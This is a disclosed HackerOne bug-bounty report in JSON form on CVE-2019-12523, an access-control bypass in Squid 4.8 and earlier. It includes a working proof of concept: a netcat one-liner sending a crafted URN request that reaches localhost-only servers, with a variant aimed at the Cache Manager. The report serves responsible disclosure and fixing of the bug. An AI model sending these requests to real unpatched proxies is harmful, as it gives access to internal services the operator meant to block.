{
  "id": 824802,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjQ4MDI=",
  "url": "https://hackerone.com/reports/824802",
  "title": "URN Request bypass ACL Checks",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-03-19T18:17:10.917Z",
  "submitted_at": "2020-03-19T18:17:10.917Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jeriko_one",
    "url": "/jeriko_one",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134028Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d8fc5087ac2ad1012eb78f640245773cb4c77405e989c2d1de8c7b6c84aacdd1",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134028Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c10027f1c27f2c87a46b9880c4914e1414a59b68d1d9d1685d40f8a71a93ffb2"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-12523"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2021-08-26T23:32:28.453Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2021-07-27T23:32:21.941Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nAttacker can bypass ACL checks gaining access to restricted HTTP servers such as those running on localhost. Attacker could also gain access to CacheManager if VIA\nheader is turned off. Only lines with : will be readable though, and the response must be less than 4096 bytes or it'll trigger the Heap Overflow I reported earlier. \n\nThis is due to URN request being transformed into HTTP request, and not going through the ACL checks that incoming HTTP request go through. \n\n<= Squid-4.8 Vulnerable\nFixed in Squid-4.9\nSquid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_8.txt\nAssigned  CVE-2019-12523 \n\n## Steps To Reproduce:\nEnable URN by adding the following entry to Safe_ports\n```\nacl Safe_ports port 0           # urn\n```\n\nEnsure that you're blocking request to localhost\n```\nhttp_access deny to_localhost\n```\n1) Start Squid\n```\n./sbin/squid \n```\n\n2) Start a HTTP server on localhost serving a file that has colons\n```\npython -m http.server --bind 127.0.0.1 8080\n```\nContents of hello.html\n```\n<html>\n\t<body>\n\tNotice: For localhost only\n\t</body>\n</html>\n```\n\n3) Make the following URN request\n\n```\necho -e \"GET urn::@127.0.0.1:8080/hello.html? HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n\nHTTP/1.1 302 Found\nServer: squid/4.8\nMime-Version: 1.0\nDate: Thu, 19 Mar 2020 18:11:20 GMT\nContent-Type: text/html\nContent-Length: 460\nExpires: Thu, 19 Mar 2020 18:11:20 GMT\nLocation: \tNotice: For localhost only\nX-Cache: MISS from g64\nVia: 1.1 g64 (squid/4.8)\nConnection: keep-alive\n\n<TITLE>Select URL for urn::@127.0.0.1:8080/hello.html?</TITLE>\n<STYLE type=\"text/css\"><!--BODY{background-color:#ffffff;font-family:verdana,sans-serif}--></STYLE>\n<H2>Select URL for urn::@127.0.0.1:8080/hello.html?</H2>\n<TABLE BORDER=\"0\" WIDTH=\"100%\">\n<TR><TD><A HREF=\"\tNotice: For localhost only\">\tNotice: For localhost only</A></TD><TD align=\"right\">Unknown</TD><TD> </TD></TR>\n</TABLE><HR noshade size=\"1px\">\n<ADDRESS>\nGenerated by squid/4.8@g64\n</ADDRESS>\n\n```\n\n## Analysis\nURN Request are different than other request coming into Squid. The original\nURN request is hardly parsed from Anyp::Uri::parse only setting a scheme and path.\n\nAnyP::Uri::parse\n    } else if (strncmp(url, \"urn:\", 4) == 0) {\n        debugs(23, 3, \"Split URI '\" << url << \"' into proto='urn', path='\" << (url+4) << \"'\");\n        debugs(50, 5, \"urn=\" << (url+4));\n        setScheme(AnyP::PROTO_URN, nullptr);\n        path(url + 4);\n        return true;\nOnce it's reached FwdState::Start it arrives in it's own URN code. The original\nURN request is then transformed into a new HTTP request.\n\nUrnState::setUriResFromRequest\n    char *host = getHost(uri);\n    snprintf(local_urlres, 4096, \"http://%s/uri-res/N2L?urn:\" SQUIDSBUFPH, host, SQUIDSBUFPRINT(uri));\n    safe_free(host);\n    safe_free(urlres);\n    urlres_r = HttpRequest::FromUrl(local_urlres, r->masterXaction);\n\nThis new HTTP Request is sent directly to FwdState::Start without going\nthrough doCallouts or clientAccessChecks\n\nUrnState::created\n\tFwdState::Start(Comm::ConnectionPointer(), urlres_e,urlres_r.getRaw(), ale);\n\nThis allows a user to reach HTTP servers that were meant to\nbe blocked by Squid, e.g. localhost.\n\nhttp://:@127.0.0.1:7331/PATH?/uri-res/N2L?urn::@127.0.0.1:7331/PATH?\n\nSquid won't be able to callback into itself to access things like Cache\nManager since the VIA header will be set. If a Squid server was configured to\nnot send the Via header then this would give a user access to it.\nHere's a blog post that recommends removing VIA header to remove all Proxy\nheaders https://adamscheller.com/systems-administration/remove-proxy-headers-squid/\n\nIf via is off a user could send a request such as below to gain access\nGET urn::@localhost:3128/squid-internal-mgr/active_requests? HTTP/1.1\n\nBelow is the CacheManager getting accessed via this:\nBreakpoint 2, CacheManager::start (this=0x603000000e80, client=..., request=0x61c00001f880, entry=0x60c00001ff00, ale=...) at cache_manager.cc:307\n(gdb) p request->url->absolute_->store_.p_->mem\n$25 = 0x62900000f200 \"http://g64:3128/squid-internal-mgr/active_requests?/uri-res/N2L?urn::@localhost:3128/squid-internal-mgr/active_requests?\n\nA user abusing this won't see the full response, since URN handles URLs and\nlooks for :. Therefore they would only see lines containing :\n\nAlso the current state of URN it's more likely that Squid would crash due to\noverflows than show the user any data. Once that is fixed this becomes a more\nreasonable way to leak internal responses.\n\n## Impact\n\nAttacker can bypass all ACLs using an URN Request. This allows them to make HTTP GET Request to restricted resources. An attacker will be limited on what they can view from these request. Lines must contain : and the response must be less than 4096 bytes.",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-08-26T23:32:22.123Z",
  "allow_singular_disclosure_after": -77810886.74978511,
  "singular_disclosure_allowed": true,
  "vote_count": 21,
  "voters": [
    "n1m0",
    "tolga",
    "mashoud1122",
    "fqdn",
    "run_win",
    "ali",
    "akashhamal0x01",
    "sldwn",
    "kmxx",
    "snkr",
    "and 11 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 84124,
    "asset_type": "OTHER",
    "asset_identifier": "IBB (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
